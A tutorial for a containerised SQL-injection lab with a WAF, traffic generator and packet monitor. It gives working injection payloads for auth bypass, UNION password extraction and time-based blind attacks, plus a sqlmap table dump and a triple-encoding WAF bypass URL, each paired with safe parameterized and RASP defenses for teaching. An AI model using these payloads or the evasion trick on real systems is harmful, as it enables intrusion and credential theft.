# Cardinal Phase 1 — Tutorial

A step-by-step walkthrough of the SQL-injection lab: start it, browse the portal,
generate benign traffic, run the attacks (automated **and** by hand in your
browser), and find the captured evidence.

- **What's in scope:** this tutorial walks the **SQL injection** flows (login +
  directory search), with a benign twin on every route. The webapp also exposes
  the **XSS** sinks (reflected on `/search`, stored on `/profile` and
  `/records/<id>`) and the **insecure-deserialization** import (`/settings`,
  forwarded to `desersvc`) — see the README's "XSS and deserialization surfaces"
  for how to exercise those. Dedicated XSS/deser *attacker tooling* (XSStrike,
  ysoserial/pickle) is a later-phase add. The **WAF is live** (Coraza + OWASP CRS
  on the proxy — see the topology below); only the IDS stack remains deferred.
- **Credentials:** `alice` / `alicepw`, `bob` / `bobpw`, `carol` / `carolpw`.
- **Default mode is vulnerable** (`SQL_MODE=concat`); add `?impl=param` to any
  request to run the safe (parameterized) path instead.

---

## The lab at a glance — components & topology

The lab is **9 containers on two isolated L2 segments**. The only node wired to
*both* segments is the `proxy`, so every request from a client to the app is
forced through the WAF. That single choke point — enforced by the network shape,
not by any firewall rule — is the whole point of the testbed.

```
                      YOUR HOST  (browser + Wireshark)
                        http://localhost:8080  -> portal      (lands on proxy :80)
                        http://localhost:8089  -> Locust UI
                                   |
                                   |  ./expose-ui.sh  — socat sidecars on the Docker
                                   |                    bridge (Docker Desktop only)
                                   v
  ================ edgenet · 172.30.0.0/24 · EXTERNAL tier =================

     locust .20           attacker .30           monitor .99
     benign load          sqlmap · curl ·        passive sniffer —
     (the "crowd")        evasion scripts        taps BOTH segments
         |                     |
         +----------+----------+   HTTP
                    v
        +--------------------------------------+
        |  proxy .10       == CHOKE POINT ==    |   the ONLY node on
        |  Caddy + Coraza WAF (OWASP CRS)       |   both segments
        |    :80    enforce -> blocks (403)     |   <- your browser hits this
        |    :8080  detect  -> logs & forwards  |   <- "before-the-WAF" baseline
        +-------------------+------------------+
                            |  proxy's 2nd NIC -> 172.31.0.10
  ================ appnet · 172.31.0.0/24 · INTERNAL tier ==================
                            v          (monitor .99 taps this segment too)

     webapp .20      db .30       cache .31    desersvc .32    oobsvc .40
     Flask :5000     MariaDB      Redis        import+rebuild  DNS collector
     <- the SUT      portal DB    sessions     :8090           (OOB exfil)

   who talks to whom (inside appnet):
     webapp --SQL---------------> db         the injection target (?rasp checks here)
     webapp --session r/w-------> cache
     webapp --imported object---> desersvc   (insecure-deserialization sink)
     db     ..DNS lookup........> oobsvc      OOB-SQLi only; egress defense cuts this
```

### What each box is

| # | Node | Address(es) | Segment | Role |
|---|------|-------------|---------|------|
| 1 | **proxy** | 172.30.0.10 / 172.31.0.10 | both | Caddy reverse proxy running the **Coraza WAF (OWASP CRS)**. The only node on both segments → the enforced choke point. `:80` **blocks**, `:8080` **logs-only**. |
| 2 | **webapp** | 172.31.0.20 | appnet | The Flask staff portal (gunicorn :5000) — the **system under test**. Holds the SQLi/XSS/deser sinks and every `?impl` / `?rasp` / `?decode` / … toggle. |
| 3 | **db** | 172.31.0.30 | appnet | MariaDB with the seeded `portal` database (users, directory, comments). What the injections read. |
| 4 | **cache** | 172.31.0.31 | appnet | Redis; stores the webapp's serialized session blobs. |
| 5 | **desersvc** | 172.31.0.32 | appnet | Object-reconstruction service (:8090) the webapp forwards imported objects to — the insecure-deserialization sink. |
| 6 | **oobsvc** | 172.31.0.40 | appnet | DNS collector; the **out-of-band exfiltration** target for the OOB-SQLi scenario. The egress-control defense is exactly what cuts the db's reach to it. |
| 7 | **locust** | 172.30.0.20 | edgenet | Benign traffic generator — the "employees using the app" noise the attack must hide in. |
| 8 | **attacker** | 172.30.0.30 | edgenet | Your attack box: sqlmap, curl, and the `/scripts/*` payload + evasion drivers. |
| 9 | **monitor** | 172.30.0.99 / 172.31.0.99 | both | Passive tcpdump/tshark on **both** segments → pcaps + live HTTP log + DB-query log. Never originates traffic. |

> Nodes 4–6 (`cache`, `desersvc`, `oobsvc`) belong to the XSS/deserialization and
> out-of-band scenarios that share this one environment; the SQLi walkthrough below
> only exercises **proxy → webapp → db**. They're drawn here so the full picture is
> in one place.

### How one request flows (the SQLi path)

1. A client — `locust`, `attacker`, or **your browser** — sends `GET /search?q=…`
   or `POST /login` to the **proxy** on edgenet.
2. The proxy runs it through **Coraza/CRS**. On **`:80`** a recognizable payload is
   **blocked (403)**; on **`:8080`** it is **logged and forwarded** (the pre-WAF baseline).
3. If it passes, the proxy forwards it over appnet to **webapp:5000** — the single
   edge→app hop, because webapp has no edgenet address.
4. The **webapp** builds the SQL (vulnerable `concat` by default) and runs it on
   **db**. This is where `?rasp=` inspects the final query and `?impl=param` would
   make it safe.
5. The response returns the same way. **monitor** has silently captured every hop on
   both segments (pcaps + `http_live.log`).

**Why two segments?** `webapp`/`db`/`cache`/`desersvc`/`oobsvc` are *single-homed on
appnet* — nothing on the edge can address them directly. The only bridge is the
proxy, so the WAF can't be skipped by topology. You can prove it yourself with the
"Choke point" check in the Reference section at the bottom.

---

## 0. Where things live (read this first)

| Artifact | Node | Path | When it appears |
|---|---|---|---|
| **Packet captures (pcap)** | `monitor` | `/captures/edge-net_*.pcap`, `/captures/app-net_*.pcap` | continuously, from boot |
| **Live HTTP log** | `monitor` | `/captures/http_live.log` | continuously, from boot |
| **sqlmap output + dumps** | `attacker` | `/tmp/sqlmap-output/` | only **after** you run `/scripts/run_sqli.sh` |
| **sqlmap console log** | `attacker` | `/tmp/sqlmap-results.log` | only after `run_sqli.sh` |

> The pcaps are **not** on the attacker node. The attacker's `/tmp` is empty
> until you actually launch `run_sqli.sh`.

---

## 1. Build the images (one time)

```bash
cd sql-injection
./build-images.sh          # builds the 9 cardinal/* images; re-run after editing any images/*/Dockerfile
```

## 2. Start the lab and publish the web UIs

```bash
kathara lstart --noterminals   # boots all 9 nodes (~30s; the DB seeds itself on boot)
./expose-ui.sh             # portal -> :8080 (WAF enforcing) + :8081 (WAF detect-only), Locust -> :8089
```

`expose-ui.sh` is needed on **Docker Desktop** (Mac/Windows), where Kathara's own
host-port publishing doesn't work; it runs small `socat` sidecars. It publishes the
portal **twice**: `:8080` through the proxy's **enforcing** WAF and `:8081` through
its **detection-only** port — the second is the one you use to demonstrate attacks
and defenses in the browser without CRS blocking them first (see §8). Re-run it any
time after `lstart`. On native-Linux Kathara you can instead use the
`proxy[port]` / `locust[port]` options and skip it.

Check everything is up:

```bash
docker ps --format '{{.Names}}\t{{.Status}}' | grep -E '_(proxy|webapp|db|cache|desersvc|oobsvc|locust|attacker|monitor)_'
curl -s -o /dev/null -w 'portal %{http_code}\n' http://localhost:8080/login   # expect 200
```

## 3. Explore the portal (the system under test)

Open **http://localhost:8080** and:

- Log in as `alice` / `alicepw`.
- Use **Directory** to search (e.g. `Alice`, `Engineering`) and click a person.
- Notice the results page prints the **exact SQL it executed** — handy for seeing
  what your input did to the query.

## 4. Start benign background traffic (Locust)

Open **http://localhost:8089**:

1. **Number of users:** `10`  2. **Spawn rate:** `2`  3. host is already
   `http://172.30.0.10` → **Start**.

This is the ambient "employees using the app" noise the attack must hide in.
Leave it running.

## 5. Watch the monitor (own terminal)

```bash
kathara connect monitor
tail -f /captures/http_live.log
```

You'll see live HTTP on **both** segments — `172.30.x` (client → proxy) and
`172.31.x` (proxy → webapp). Full pcaps grow in `/captures/`.

---

## 6. Attack A — automated (from the attacker node)

Open another terminal:

```bash
kathara connect attacker

# Fast, hand-crafted payloads (auth bypass, UNION, error, time-based, stacked, baseline):
/scripts/manual_payloads.sh

# Full automated attack: sqlmap fingerprints MariaDB and dumps the tables (~1 min):
/scripts/run_sqli.sh
```

While these run, watch the monitor terminal (step 5): the injection payloads
appear **interleaved with Locust's benign requests on the same `/search` and
`/login` endpoints** — same route, different intent.

After `run_sqli.sh`, the loot is on the attacker node:

```bash
ls /tmp/sqlmap-output/172.30.0.10/dump/portal/     # users.csv, directory.csv, comments.csv
cat /tmp/sqlmap-output/172.30.0.10/dump/portal/users.csv   # includes plaintext passwords
```

---

## 7. Attack B — by hand, from the browser (no tools)

Every attack the scripts send is just an HTTP request, so you can do them
yourself in the portal at **http://localhost:8080**. The results page even shows
you the SQL that ran.

> **Heads-up — the WAF is in this path now.** `localhost:8080` reaches the proxy's
> **enforcing** port (`:80`), so Coraza/CRS will **403 most of the recognizable
> payloads below** — a result worth seeing in its own right. The "Expect" outcomes
> describe the app's *raw* behaviour, i.e. before the WAF. To watch a payload
> actually succeed, open the **detection-only URL `http://localhost:8081`** in your
> browser (published by `./expose-ui.sh` — it logs and forwards instead of blocking),
> or hit `http://172.30.0.10:8080` from the attacker node. Demonstrating your two
> tasks (RASP + encoding evasion) in the browser is spelled out in **§8**; getting a
> payload past the *enforcing* WAF is the subject of the evasion lab, `RUNBOOK.md` §4.5.

### 7a. Auth bypass (login form)

- Go to **Log in**. Username: `' OR '1'='1' -- -`  Password: anything.
- **Expect:** you're logged in (as the first user, Alice) and redirected to a
  profile — no valid password needed.
- **Safe twin:** the app defaults to vulnerable. There's no per-request toggle on
  the HTML login form, but the equivalent safe request rejects it — try it with
  curl: `curl -i -X POST 'http://localhost:8080/login?impl=param' --data-urlencode "username=' OR '1'='1' -- -" --data-urlencode 'password=x'` → **401**.

### 7b. Boolean injection (search box)

- In **Directory**, search for: `' OR '1'='1`
- **Expect:** the whole directory (all 17 people) comes back even though that's
  not a real name. The page shows the executed SQL with your `OR '1'='1'` clause.
- **Safe twin:** append `&impl=param` to the URL (e.g.
  `http://localhost:8080/search?q=' OR '1'='1&impl=param`) → **0 results**; the
  input is treated as a literal name.

### 7c. Read passwords with UNION (search box)

- Search for:
  `zzz' UNION SELECT id,username,password,title,department,bio,status FROM users-- -`
- **Expect:** rows whose **Name** column shows usernames and **Title** column
  shows their **passwords** (`alicepw`, `bobpw`, `carolpw`). The search selects 7
  columns, so the UNION must supply 7 — the columns map onto the visible table.

### 7d. Time-based blind (search box or URL)

- Search for: `zzz' UNION SELECT SLEEP(3),2,3,4,5,6,7-- -`
- **Expect:** the page hangs for ~3 seconds before responding — proof the DB ran
  your `SLEEP(3)`. A normal search returns in milliseconds.

### 7e. Error-based payload (what to expect, and its limit)

- Search for the error-based payload (the long `... COUNT(*),CONCAT(... FLOOR(RAND(0)*2)) ...`
  from `manual_payloads.sh`).
- **Expect:** an HTTP **500** page — the payload reaches the DB and breaks the
  query. But it does **not** leak data here: the app returns a generic 500 with
  no SQL error text, so classic error-based *extraction* has nothing to read.
  (Realistic: production apps hide DB errors. UNION and blind techniques still
  work, which is why sqlmap uses those.)

### 7f. Stacked query (what to expect)

- Search for: `'; SELECT * FROM users WHERE '1'='1`
- **Expect:** HTTP **500**. The driver (PyMySQL) executes a single statement, so
  a second stacked statement is rejected — a useful negative result.

### Quick reference — browser payloads

| Where | Type in | Expect |
|---|---|---|
| Login → Username | `' OR '1'='1' -- -` | logged in without a password |
| Directory search | `' OR '1'='1` | all 17 people returned |
| Directory search | `zzz' UNION SELECT id,username,password,title,department,bio,status FROM users-- -` | usernames + **passwords** in the table |
| Directory search | `zzz' UNION SELECT SLEEP(3),2,3,4,5,6,7-- -` | ~3s delay |
| URL, any search | add `&impl=param` | injection neutralized (safe path) |

> Comment style: use `-- -` (dash, space, dash) in the search box and login form.
> Don't use `#` in the browser URL bar — the browser treats `#` as a fragment and
> won't send it to the server.

---

## 8. Demonstrate your tasks in the UI (RASP + double-encoding)

Both structural-defense tasks can be shown entirely in the browser. The catch is
**which URL you use**, because the enforcing WAF will `403` a recognizable payload
before your app-level defense ever runs:

| Open this URL | Proxy port | WAF mode | Use it to show |
|---|---|---|---|
| `http://localhost:8080` | `:80` | **enforcing** — blocks (403) | the WAF blocking a payload, and **beating** it (encoding evasion) |
| `http://localhost:8081` | `:8080` | **detection-only** — logs, forwards | the **app's own** behaviour and defenses (RASP, `?impl=param`, `?decode`) with CRS out of the way |

Both are published by `./expose-ui.sh` (step 2). If `:8081` doesn't load, re-run it.

> **Tip:** these demos add query args like `&rasp=…` / `&decode=…`. **Paste the whole
> URL into the address bar** — don't type a payload into the search box, which
> re-encodes everything on submit and breaks the double-encoding demo.

### Task 1 — RASP structural detector (reference §2.4)

Use the **detection URL (`:8081`)** so the 403 you see is **RASP's**, not CRS's.

| Paste into the address bar | You should see |
|---|---|
| `http://localhost:8081/search?q=' OR '1'='1&rasp=block` | **403 — "[RASP] blocked: input added query structure"**, printing the *intended* vs *final* query shape. The value added a boolean clause, so the skeletons differ. |
| `http://localhost:8081/search?q=' OR '1'='1&rasp=detect` | **all rows (200)** — RASP only *logs* here (verdict appended to `/shared/rasp_audit.log`), so you see what it would have blocked. |
| `http://localhost:8081/search?q=Alice&rasp=block` | **Alice's row** — a real search keeps the intended shape, so RASP allows it. It blocks *structure*, not values. |
| `http://localhost:8081/search?q=zzz' UNION SELECT id,username,password,title,department,bio,status FROM users-- -&impl=proc&rasp=block` | **usernames + passwords still leak** — the documented blind spot: RASP can't see SQL built *inside* the DB (`impl=proc`). |

**One-line story:** `rasp=block` turns every value-position injection on `/search`
and `/login` into a 403 at the DB call — *regardless of the WAF* — but it
deliberately does not cover the stored-proc or second-order (`/myteam`) paths
(see `RUNBOOK.md` §4.4).

### Task 2 — alternate / multi-encoding WAF evasion (reference §3)

"Double-URL-encoding is the classic" — but against *this* WAF it isn't enough, and
seeing why is the real lesson. Coraza/CRS **decodes two encoding layers** before it
inspects (once parsing the argument, once more via its `urlDecodeUni` transform), so
it sees straight through a double-encoded payload and libinjection catches it. The
evasion works only if the app decodes **one layer more than the WAF** — so you
**triple-encode** the payload and set **`decode=triple`** (the app then decodes three
times: Werkzeug once + two extra unquotes).

**a) Everything up to double-encoded is blocked** — on the **enforcing URL (`:8080`)**:

| Type / paste | Result |
|---|---|
| search box: `' OR '1'='1` (plain) | **403** — the 403 you've been hitting |
| the double-encoded URL + `&decode=double` | **403** — the WAF decoded *both* layers |

Confirm which rule caught it — it's the SQLi detector, not an encoding rule:
```bash
kathara connect proxy
tail -n 3 /shared/waf_audit.log | grep -oE '9[0-9]{5}' | sort -u   # shows 942100 (libinjection)
```

**b) Triple-encoded + `decode=triple` slips past — the bypass.** Still on the
**enforcing URL (`:8080`)**, paste this (it is `' OR '1'='1` with every byte
percent-encoded **three** times, so the WAF's two decodes leave only harmless `%XX`):
```
http://localhost:8080/search?q=%252527%252520%25254F%252552%252520%252527%252531%252527%25253D%252527%252531&decode=triple
```
→ **all rows.** The WAF saw no SQL and forwarded; the app's **third** decode re-formed
`' OR '1'='1` and it fired — past a **fully-armed** WAF, no rules disabled.

> **Why triple, not double?** The app and the WAF each normalize encodings; the attack
> works only when the app out-decodes the WAF. This CRS does two decodes, so you need
> three. `decode=double` ties it and loses — which is exactly what you saw.

**c) Dump passwords the same way (UNION)** — the attacker script runs the whole walk
(it percent-encodes the keyword letters too, so `UNION SELECT` is invisible to the WAF):
```bash
kathara connect attacker
/scripts/encoding_evasion.sh    # plain -> single -> double (all blocked) -> triple (fires) -> RASP
```

**Compose both tasks** — add `&rasp=block` to the step-(b) URL:
```
http://localhost:8080/search?q=%252527%252520%25254F%252552%252520%252527%252531%252527%25253D%252527%252531&decode=triple&rasp=block
```
→ **403 from RASP.** The payload still beats the WAF, but RASP inspects the **decoded**
query at the DB call — the encoding trick that blinds the WAF is useless against the
structural detector. That composition is the headline result of both tasks together.

---

## 9. Save the evidence (before teardown)

pcaps live inside the `monitor` container and are lost on `lclean`, so copy them
to your machine first:

```bash
docker cp "$(docker ps --format '{{.Names}}' | grep _monitor_)":/captures ./pcaps
# open ./pcaps/*.pcap in Wireshark, or:
#   tshark -r ./pcaps/edge-net_*.pcap -Y http.request -T fields -e ip.src -e http.request.uri
```

Grab the sqlmap dumps too, if you ran it:

```bash
docker cp "$(docker ps --format '{{.Names}}' | grep _attacker_)":/tmp/sqlmap-output ./sqlmap-output
```

## 10. Tear down

```bash
kathara lclean
docker rm -f cardinal-webapp-ui cardinal-locust-ui
```

---

## Reference

**Topology (two L2 segments; only the proxy bridges them):**

| Node | edgenet | appnet | Role |
|---|---|---|---|
| proxy | 172.30.0.10 | 172.31.0.10 | Coraza WAF (OWASP CRS) + reverse proxy (choke point) |
| locust | 172.30.0.20 | — | benign traffic |
| attacker | 172.30.0.30 | — | sqlmap / curl |
| webapp | — | 172.31.0.20 | Flask app (gunicorn :5000) — the system under test |
| db | — | 172.31.0.30 | MariaDB (`portal` DB) |
| cache | — | 172.31.0.31 | Redis (serialized sessions) |
| desersvc | — | 172.31.0.32 | object-reconstruction service (:8090) |
| oobsvc | — | 172.31.0.40 | DNS collector (out-of-band exfil target) |
| monitor | 172.30.0.99 | 172.31.0.99 | passive capture (both segments) |

**Routes / toggle:**

| Route | SQLi surface | Toggle |
|---|---|---|
| `POST /login` | auth bypass (concat) | `?impl=param` for safe |
| `GET /search?q=` | boolean / UNION / time-based (concat) | `?impl=param` for safe |
| `GET /profile/<id>` | none — parameterized control route | — |

**Choke point:** from the attacker, the app and data tiers are **unreachable
directly** — only the proxy is:

```bash
kathara connect attacker
curl --max-time 4 http://172.31.0.20:5000/   # webapp: fails
curl --max-time 4 http://172.31.0.30:3306/   # db: fails
curl http://172.30.0.10/healthz              # proxy: 200
```
